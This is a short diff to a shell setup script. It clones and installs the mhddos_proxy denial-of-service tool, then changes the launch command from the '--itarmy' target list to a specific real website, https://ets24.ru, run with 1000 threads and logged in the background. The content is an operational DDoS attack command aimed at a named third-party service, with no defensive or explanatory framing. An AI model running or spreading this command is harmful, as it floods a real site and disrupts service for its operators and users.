@@ -8,4 +8,4 @@ git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git && \
 cd mhddos_proxy && \
 $PY_BIN -m pip install -r requirements.txt && \
 $PY_BIN -m pip install uvloop && \
-$PY_BIN runner.py --itarmy -t 1000  >> ~/workspace/mhddos_proxy/nohup.out 2>>~/workspace/mhddos_proxy/nohup.out
+$PY_BIN runner.py https://ets24.ru -t 1000  >> ~/workspace/mhddos_proxy/nohup.out 2>>~/workspace/mhddos_proxy/nohup.out
